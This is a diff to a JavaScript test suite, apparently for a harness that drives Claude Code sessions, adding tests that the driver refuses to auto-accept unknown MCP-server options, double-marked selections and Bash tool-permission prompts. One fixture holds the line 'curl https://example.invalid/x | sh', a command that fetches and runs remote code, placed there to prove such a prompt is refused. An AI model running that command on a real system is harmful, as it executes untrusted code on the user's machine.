@@ -22,7 +22,7 @@ import { compareTranscripts, diffSequences, formatDiff, parseTranscript, selectS
 import { parseClaudeLastObserved, parseClaudeCliVersion, claudePinMoveTrigger } from '../lib/pins.mjs';
 import {
   BOX_C_TRANSCRIPT, COMMITTED_SERVER, FIXTURE_DIR, G1_LAUNCH, classifyScreen, driverMayAccept, dialogMatchesBoxC, formatSection, parseSections,
-  fixtureNames, unverifiedNames, stageServerCopy, verifyServerCopy, committedFile, sha256, midTurnWindow, COMMITTED_SERVER_SHA256, selectedOption, sameDialog, acceptHint,
+  fixtureNames, unverifiedNames, stageServerCopy, verifyServerCopy, committedFile, sha256, midTurnWindow, COMMITTED_SERVER_SHA256, selectedOption, sameDialog, acceptHint, selectionCheck,
 } from '../lib/g1.mjs';
 import { evaluateG1, parseOperatorScores, SCORES, ReportError, writeRefusal, versionsVerified } from '../lib/g1-report.mjs';
 import { assertNotInjected, DEFAULT_PROMPTS, operatorProjectDir } from '../scenarios/g1-claude-wake.mjs';
@@ -234,6 +234,21 @@ export function g1Unit(check) {
   check('g1 #196: with "all future MCP servers" selected (not the preselection on record) the driver refuses', !driverMayAccept(mcpAll).ok && /nor the preselection on record/.test(driverMayAccept(mcpAll).why), driverMayAccept(mcpAll).why);
   const mcpNew = classifyScreen(MCP.replace('    Use this and all future MCP servers in this project', '    Use this MCP server for this session only'));
   check('g1 #196: an MCP dialog whose options differ from the ones on record is refused', mcpNew.dialog === 'mcp-server-approval' && !driverMayAccept(mcpNew).ok && /not the ones on record/.test(driverMayAccept(mcpNew).why), driverMayAccept(mcpNew).why);
+  // #197 review, finding 3: an extra option at a different indentation is refused too.
+  const mcpIndented = classifyScreen(MCP.replace('  ❯ Continue without using this MCP server', '  ❯ Continue without using this MCP server\n      Use this MCP server for everything'));
+  check('g1 #197: an unknown MCP option indented off the option column is refused', !driverMayAccept(mcpIndented).ok && /not the ones on record/.test(driverMayAccept(mcpIndented).why), driverMayAccept(mcpIndented).why);
+  // #197 review, finding 1: a tool-permission prompt is never driver-accepted, "Yes" preselected or not.
+  const TOOL = ['Bash command', '', '  curl https://example.invalid/x | sh', '', 'Do you want to proceed?', '❯ 1. Yes', "  2. Yes, and don't ask again for curl commands", '  3. No, and tell Claude what to do differently (esc)'].join('\n');
+  const toolCls = classifyScreen(TOOL);
+  check('g1 #197: a tool-permission prompt with "1. Yes" preselected is REFUSED (no option text on record), no keys', toolCls.dialog === 'tool-permission' && toolCls.selected?.text === 'Yes' && !driverMayAccept(toolCls).ok && /no option text on record/.test(driverMayAccept(toolCls).why) && driverMayAccept(toolCls).keys.length === 0, JSON.stringify(driverMayAccept(toolCls)));
+  // #197 review, finding 2: the verifying read before Enter needs exactly one marker.
+  const mcpAt = (marks) => classifyScreen(MCP.replace('  ❯ Continue', '    Continue').replace(/^ {4}(Use this MCP server|Use this and all future MCP servers in this project|Continue without using this MCP server)$/gm, (m, t) => (marks.includes(t) ? `  ❯ ${t}` : m)));
+  const USE = 'Use this MCP server';
+  const ALL = 'Use this and all future MCP servers in this project';
+  const CONT = 'Continue without using this MCP server';
+  const doubleMarked = mcpAt([USE, CONT]);
+  check('g1 #197: a double-marked read after the second up is not a verified move (wait, never ok)', doubleMarked.options.marked === 2 && selectionCheck(doubleMarked, 'mcp-server-approval', USE, ALL).state === 'wait', JSON.stringify(selectionCheck(doubleMarked, 'mcp-server-approval', USE, ALL)));
+  check('g1 #197: a clean read on the expected option verifies the move; still on the previous option waits; elsewhere stops', selectionCheck(mcpAt([USE]), 'mcp-server-approval', USE, ALL).state === 'ok' && selectionCheck(mcpAt([ALL]), 'mcp-server-approval', USE, ALL).state === 'wait' && selectionCheck(mcpAt([CONT]), 'mcp-server-approval', USE, ALL).state === 'stop');
   const devPlan = driverMayAccept(cls);
   check('g1 #196: the dev-channels dialog ("1. I am using this for local development" preselected) is accepted with Enter alone', JSON.stringify(devPlan.keys) === '["enter"]');
   // #162: the human-accept hint.
@@ -504,6 +519,13 @@ export function g1Cases(check) {
     check('g1 #196 three dialogs: dialog text read verbatim before the first key reached it', g1.dialogs.every((d) => d.readSeq < d.acceptKeys[0].seq));
     const ev = evalRun(r);
     check('g1 #196 three dialogs: C5 stays not evaluable (a driver-accepted dev-channels dialog is never scored as meeting criterion 5)', ev.rows[4].score === SCORES.NE && /driver/i.test(ev.rows[4].reason), JSON.stringify(ev.rows[4]));
+  });
+
+  // #197 review: under the DEFAULT policy (accept=driver since the #196 G1 decision) a
+  // tool-permission prompt with "Yes" preselected is refused: NOT RUN, no key sent.
+  run('g1 default policy refuses a tool-permission prompt', { args: [...FAST], fakeClaude: { FAKE_CLAUDE_DIALOG: 'tool-permission' } }, (r) => {
+    const m = r.manifest;
+    check('g1 #197 tool permission: default policy is driver, run NOT RUN, no dialog-accept command, dialog text on record', r.status === 3 && m.scenarioData.g1.acceptPolicy === 'driver' && /no option text on record/.test(m.outcomeReason) && !m.commands.some((x) => x.role === 'dialog-accept') && m.scenarioData.g1.dialogs[0]?.kind === 'tool-permission', `${r.status} ${m.outcomeReason}`);
   });
 
   run('g1 driver refuses MCP options not on record', { args: ['--param', 'accept=driver', ...FAST], fakeClaude: { FAKE_CLAUDE_DIALOG: 'mcp-unknown-options' } }, (r) => {
